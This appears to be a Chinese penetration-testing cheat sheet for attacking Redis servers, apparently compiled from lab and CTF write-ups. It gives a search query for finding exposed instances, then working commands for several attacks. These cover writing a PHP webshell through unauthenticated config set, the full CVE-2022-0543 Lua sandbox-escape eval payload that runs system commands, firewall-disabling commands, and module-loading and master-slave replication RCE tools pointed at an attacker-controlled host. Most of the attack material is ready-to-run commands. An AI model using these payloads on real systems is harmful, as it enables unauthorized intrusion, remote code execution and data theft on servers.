## 指纹

zoomeye语法：service:"redis"+"redis_version"

| 漏洞利用公式 | 利用前提                                 |
| ------------ | ---------------------------------------- |
| 写公钥       | root权限运行redis开放了ssh，允许公钥连接 |
| 反弹shell    | root权限运行redis开启了计划任务          |
| 写入webshell | root权限运行redis知道网站根路径          |
| 主从复制     | redis 4.x/5.x                            |

## 数据库应用-Redis

默认端口：6379

Redis 是一套开源的使用 ANSI C 编写、支持网络、可基于内存亦可持久化的日志型、

键值存储数据库，并提供多种语言的 API。Redis 如果在没有开启认证的情况下，可以

导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数

据。

### 未授权访问：CNVD-2015-07557

利用方法：

##### webshell

向目标写入文件（前提是目标有网站）,需要web目录有读写权限，只有读权限会失败,且得知对方网站的绝对路径（不然后面webshell写进去不知道目录）

```
config set dir /tmp   #创建临时目录

config set dbfilename 1.php    #写入文件

set test "<?php  phpinfo(); ?>"   #向文件中写入内容

bgsave     #保存

save  #保存
```

利用：攻击机进入到cd **redis-rogue-server**文件夹里面
https://github.com/n0b0dyCN/redis-rogue-server.git

[vulfocus靶场redis 未授权访问漏洞之CNVD-2015-07557-CSDN博客](https://blog.csdn.net/qq_27249127/article/details/137914717)

python3 redis-rogue-server.py  --rhost 目标IP --rport 目标端口 --lhost 攻击者服务器IP

------

##### 写定时任务反弹shell

##### 写ssh公钥登录

redis服务使用root登录、安全模式protected-mode处于关闭状态，允许使用密钥登录

远程写入自己的公钥，然后远程登录服务器

[redis的安装以及漏洞学习_cve-2015-4335-CSDN博客](https://blog.csdn.net/weixin_54515836/article/details/119746243)

### Lua沙盒绕过 命令执行（CVE-2022-0543）

- 版本

该 Redis 沙盒逃逸漏洞仅影响 Debian 系的 Linux 发行版本,并非 Redis 本身漏洞

影响版本

Debian Redis < 5: 5.0.14-1+deb10u2

Debian Redis < 5: 6.0.16-1+deb11u2

Debian Redis < 5: 6.0.16-2

Ubuntu Redis < 5: 6.0.15-1ubuntu0.1

Ubuntu Redis < 5: 5.0.7-2ubuntu0.1

发现版本

redis/5: 5.0.14-1+deb10u1,

redis/5: 5.0.3-4, redis/5: 6.0.15-1

- 原理：

Redis是著名的开源Key-Value数据库，其具备在沙箱中执行Lua脚本的能力。

Debian以及Ubuntu发行版的源在打包Redis时，不慎在Lua沙箱中遗留了一个对象package，攻击者可以利用这个对象提供的方法加载动态链接库liblua里的函数，进而逃逸沙箱执行任意命令。

我们借助Lua沙箱中遗留的变量package的loadlib函数来加载动态链接库/usr/lib/x86_64-linux-gnu/liblua5.1.so.0里的导出函数luaopen_io。在Lua中执行这个导出函数，即可获得io库，再使用其执行命令：

```
local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io");
local io = io_l();
local f = io.popen("id", "r");
local res = f:read("*a");
f:close();
return res
```

连接redis，使用eval命令执行上述脚本：

eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l()

原文链接：https://blog.csdn.net/qq_20737293/article/details/123745920

- 利用

利用redis Desktop Mananager或者redis-cli连接redis数据库后

关闭防火墙：

```
 CentOS

service iptables stop

# Ubuntu

service ufw stop
```

执行命令：

```
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
```

//上述命令获取用户id，想获取其他具体把id改为其他命令即可

```
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("whoami", "r"); local res = f:read("*a"); f:close(); return res' 0
----------
查看flag，flag在env环境变量中，用读取

 eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("env", "r"); local res = f:read("*a"); f:close(); return res' 0
```

###  未授权访问 (CNVD-2019-21763)

[CNVD-2019-21763（复现）-腾讯云开发者社区-腾讯云](https://cloud.tencent.com/developer/article/1627282)
[Redis未授权访问漏洞复现 CNVD-2019-21763 & CNVD-2015-07557-CSDN博客](https://blog.csdn.net/MateSnake/article/details/139012023)

由于在Reids 4.x及以上版本中新增了模块功能，攻击者可通过外部拓展，在Redis中实现一个新的Redis命令。通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写C语言并编译出 .so 文件。

攻击者可以利用该功能引入模块，在未授权访问的情况下使被攻击服务器加载自己编写的恶意.so 文件，从而实现远程代码执行。

```
python redis-master.py -r 目标IP -p 目标端口 -L 攻击IP -P 攻击IP的端口号 -f RedisModulesSDK/exp/exp.so -c "id"
```

### 主从复制

##### 版本

利用redis主从复制redis版本要是4.x或者5.x

##### 原理

```
Redis主从复制我们简单理解为有两台redis服务器,一个是主，一个是从，两台服务器的数据是一样的，主服务器负责写入数据，从服务器负责读取数据。一般一个主服务器有好几个从服务器，且从服务器可能也是其他redis服务器的主服务器。这样的好处就是如果主服务器或者一个从服务器崩溃不会影响数据完整性，且读写分开，减轻服务器压力。
Redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中。但是要保证硬盘文件不被删除，而主从复制则能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis。

```

##### 利用

```
第一步：git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git
      #下载RedisModules-ExecuteCommand
      # 其他项目：https://github.com/vulhub/redis-rogue-getshell
第二步：git clone https://github.com/Ridter/redis-rce
      #下载redis-rce
第三步：cd RedisModules-ExecuteCommand
第四步:make
      #进入RedisModules-ExecuteCommand 使用make进行编译
第五步:mv module.so /root/redis-rce
      #编译之后将module.so移到redis-rce
第六步：cd /root/redis-rce
第七步：python3 redis-rce.py -r 192.168.0.154 -L 192.168.0.132 -f module.so
      #进入到redis-rce 执行命令，-r是目标IP -L是攻击机ip

```

[Redis漏洞大全~讲解最全的漏洞利用方法-CSDN博客](https://blog.csdn.net/weixin_67832625/article/details/141035683)
